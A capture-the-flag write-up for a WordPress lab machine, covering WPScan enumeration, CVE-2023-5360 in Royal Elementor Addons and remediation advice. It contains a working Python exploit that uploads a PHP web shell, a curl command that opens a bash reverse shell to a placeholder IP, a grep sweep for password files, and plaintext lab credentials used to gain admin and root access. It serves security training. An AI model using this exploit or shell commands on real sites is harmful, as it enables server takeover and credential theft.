To access the target domain locally, I edited the `/etc/hosts` file and mapped the domain name to the target IP address.

```bash
sudo nano /etc/hosts
```

I added the following line:

```text
 172.20.14.182 gridloy.hv
```

After saving the file, the website was accessible at:

```
http://gridloy.hv
```
### Content Review

When visiting the website, I observed a minimalistic blog layout. While browsing several posts, I noticed that the author consistently used the pseudonym **"Currol"**.

<img width="1913" height="873" alt="cevap 1" src="https://github.com/user-attachments/assets/d39b33b3-e52c-4ac2-b126-802f60447ae0" />


✅ **Answer 1:** The author's pseudonym is **Currol**.

---

## 3. WordPress Enumeration with WPScan

### 3.1 Full WPScan Analysis

To identify WordPress components and vulnerabilities, I ran WPScan with aggressive detection enabled.

```bash
wpscan --url http://gridloy.hv \
  --enumerate u,p,t,tt,cb,dbe \
  --plugins-detection aggressive \
  --api-token YOUR_API_TOKEN
```

📸 **Screenshot 3:** WPScan full output

### 3.2 Key Findings

* **WordPress Version:** 6.4.2 (outdated)
* **Active Theme:** Minimal Blogger
* **Identified User:** admin
* **Vulnerable Plugin:** Royal Elementor Addons v1.3.78
* **Critical CVE:** CVE-2023-5360 (Unauthenticated File Upload)

---

## 4. Vulnerability Research

### 4.1 CVE-2023-5360 Analysis

The vulnerability exists due to missing nonce validation in the `wpr_addons_upload_file` AJAX endpoint. This allows unauthenticated users to upload arbitrary files, including PHP web shells.

Impact:

* Remote Code Execution (RCE)
* Full server compromise

---

## 5. Exploitation – Gaining Initial Access

### 5.1 Exploit Script (Python)

I wrote a Python script to automatically extract the nonce value and upload a PHP web shell.

```python
#!/usr/bin/env python3
import requests, re, json, sys

def get_nonce(target):
    r = requests.get(target, verify=False)
    m = re.search(r'var\s+WprConfig\s*=\s*({.*?});', r.text)
    return json.loads(m.group(1)).get("nonce") if m else None

def upload_shell(target, nonce):
    ajax = target.rstrip('/') + '/wp-admin/admin-ajax.php'
    files = {"uploaded_file": ("shell.php", b'<?php system($_GET["cmd"]); ?>')}
    data = {
        "action": "wpr_addons_upload_file",
        "wpr_addons_nonce": nonce
    }
    r = requests.post(ajax, data=data, files=files, verify=False)
    return json.loads(r.text)["data"]["url"] if r.status_code == 200 else None

nonce = get_nonce("http://gridloy.hv")
shell = upload_shell("http://gridloy.hv", nonce)
print(shell)
```

📸 **Screenshot 4:** Exploit script execution

### 5.2 Web Shell Verification

```bash
curl "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php?cmd=id"
```

📸 **Screenshot 5:** RCE confirmation (`www-data`)

---

## 6. Reverse Shell

### 6.1 Listener Setup

```bash
nc -lvnp 4444
```

### 6.2 Reverse Shell Trigger

```bash
curl "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
```

📸 **Screenshot 6:** Reverse shell as `www-data`

---

## 7. Post-Exploitation Enumeration

### 7.1 Sensitive File Discovery

```bash
find /var/www/html/wordpress -type f -name "*.txt" -exec grep -i password {} \;
```

📸 **Screenshot 7:** `my_passwords.txt` discovery

### 7.2 Extracted Credentials

```text
EMAIL: beth@gridloy.hv
WORDPRESS USER: admin
WORDPRESS PASS: b2tGAIvRDpJpNit6q2
MYSQL USER: root
MYSQL PASS: LhfJ5DuAYN5nsSvB
SYSTEM ROOT PASS: aceRyanDI
```

✅ **Answer 2:** WordPress password is **b2tGAIvRDpJpNit6q2**

---

## 8. WordPress Admin & Database Access

### 8.1 WordPress Admin Login

```text
URL: http://gridloy.hv/wp-login.php
Username: admin
Password: b2tGAIvRDpJpNit6q2
```

📸 **Screenshot 8:** WordPress admin panel

### 8.2 MySQL Access

```bash
mysql -u root -p
```

### 8.3 Unpublished Comment Discovery

```sql
SELECT comment_author, comment_content
FROM wp_comments
WHERE comment_approved = 0;
```

📸 **Screenshot 9:** Pending comment

✅ **Answer 3:** Unpublished comment author is **Judson Braun**

---

## 9. Privilege Escalation – Root Access

```bash
su root
```

📸 **Screenshot 10:** Root shell

---

## 10. Final Flag – Site Owner Information

```bash
cat /root/site_owner_informations.txt
```

📸 **Screenshot 11:** Site owner information

✅ **Answer 4:** The real name of **Currol** is **Beth Ryan**

---

## 11. Vulnerability Summary

* CVE-2023-5360 – Unauthenticated File Upload
* Outdated WordPress Core & Plugins
* Plaintext password storage
* Password reuse across services

---

## 12. Remediation Recommendations

* Update Royal Elementor Addons (>= 1.3.79)
* Keep WordPress core, themes, and plugins updated
* Never store credentials in plaintext files
* Enforce strong and unique passwords
* Perform regular security audits

---

✅ **CTF Completed Successfully**

---

> ✍️ Prepared for **GitHub** and **Medium** publication

